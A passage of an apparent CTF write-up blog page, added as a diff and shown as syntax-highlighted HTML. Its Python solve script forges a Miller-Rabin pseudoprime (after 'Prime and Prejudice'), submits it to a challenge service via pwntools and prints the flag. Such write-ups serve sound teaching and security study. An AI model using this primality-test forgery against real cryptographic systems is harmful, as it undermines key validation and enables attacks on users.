+        <span class="n">X</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">za</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">fast_crt</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
+            <span class="n">z</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="n">_backtrack</span><span class="p">(</span><span class="n">S</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">z</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">m</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">z</span><span class="p">,</span> <span class="n">m</span>
+        <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
+            <span class="k">pass</span>
+        <span class="n">X</span><span class="p">.</span><span class="n">pop</span><span class="p">()</span>
+
+    <span class="n">M</span><span class="p">.</span><span class="n">pop</span><span class="p">()</span>
+    <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">generate_pseudoprime</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">k2</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">k3</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">min_bit_length</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="s">"""
+    Generates a pseudoprime of the form p1 * p2 * p3 which passes the Miller-Rabin primality test for the provided bases.
+    More information: R. Albrecht M. et al., "Prime and Prejudice: Primality Testing Under Adversarial Conditions"
+    :param A: the bases
+    :param k2: the k2 value (default: next_prime(A[-1]))
+    :param k3: the k3 value (default: next_prime(k2))
+    :param min_bit_length: the minimum bit length of the generated pseudoprime (default: 0)
+    :return: a tuple containing the pseudoprime n, as well as its 3 prime factors
+    """</span>
+    <span class="n">A</span><span class="p">.</span><span class="n">sort</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">k2</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">k2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">next_prime</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+    <span class="k">if</span> <span class="n">k3</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">k3</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">next_prime</span><span class="p">(</span><span class="n">k2</span><span class="p">))</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Trying </span><span class="si">{</span><span class="n">k2</span> <span class="o">=</span> <span class="si">}</span><span class="s"> and </span><span class="si">{</span><span class="n">k3</span> <span class="o">=</span> <span class="si">}</span><span class="s">..."</span><span class="p">)</span>
+        <span class="n">X</span> <span class="o">=</span> <span class="p">[</span><span class="nb">pow</span><span class="p">(</span><span class="o">-</span><span class="n">k3</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">k2</span><span class="p">),</span> <span class="nb">pow</span><span class="p">(</span><span class="o">-</span><span class="n">k2</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">k3</span><span class="p">)]</span>
+        <span class="n">M</span> <span class="o">=</span> <span class="p">[</span><span class="n">k2</span><span class="p">,</span> <span class="n">k3</span><span class="p">]</span>
+        <span class="n">S</span> <span class="o">=</span> <span class="n">_generate_s</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">S</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">z</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="n">_backtrack</span><span class="p">(</span><span class="n">S</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">z</span> <span class="ow">and</span> <span class="n">m</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Found residue </span><span class="si">{</span><span class="n">z</span><span class="si">}</span><span class="s"> and modulus </span><span class="si">{</span><span class="n">m</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span> <span class="o">**</span> <span class="p">(</span><span class="n">min_bit_length</span> <span class="o">//</span> <span class="mi">3</span><span class="p">))</span> <span class="o">//</span> <span class="n">m</span>
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">p1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">z</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="n">m</span><span class="p">)</span>
+                <span class="n">p2</span> <span class="o">=</span> <span class="n">k2</span> <span class="o">*</span> <span class="p">(</span><span class="n">p1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+                <span class="n">p3</span> <span class="o">=</span> <span class="n">k3</span> <span class="o">*</span> <span class="p">(</span><span class="n">p1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+                <span class="k">if</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">p2</span><span class="p">)</span> <span class="ow">and</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">p3</span><span class="p">):</span>
+                    <span class="k">return</span> <span class="n">p1</span> <span class="o">*</span> <span class="n">p2</span> <span class="o">*</span> <span class="n">p3</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span>
+
+                <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">k3</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">next_prime</span><span class="p">(</span><span class="n">k3</span><span class="p">))</span>
+<span class="c1"># =========================================================================================
+</span>
+<span class="n">bases</span> <span class="o">=</span> <span class="n">predict_bases</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">rounds</span><span class="o">=</span><span class="mi">6</span><span class="p">)</span>
+<span class="n">N</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span> <span class="o">=</span> <span class="n">generate_pseudoprime</span><span class="p">(</span><span class="n">bases</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Found pseudoprime N = </span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Factor 1 (p1) = </span><span class="si">{</span><span class="n">p1</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Factor 2 (p2*p3) = </span><span class="si">{</span><span class="n">p2</span> <span class="o">*</span> <span class="n">p3</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"0"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your prime: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span><span class="sa">b</span><span class="s">":iku:"</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"4"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Factor 1: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">p1</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Factor 2: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">p2</span><span class="o">*</span><span class="n">p3</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1"># wack{7Hi5_7im3_wi7h_4_5i6n3d_c0mP3ri50N}
+</span></code></pre></div></div>
+
+
+    </div>
+    <footer>
+      <p>&copy; 2025 Zukane</p>
+    </footer>
+  </body>
+</html>
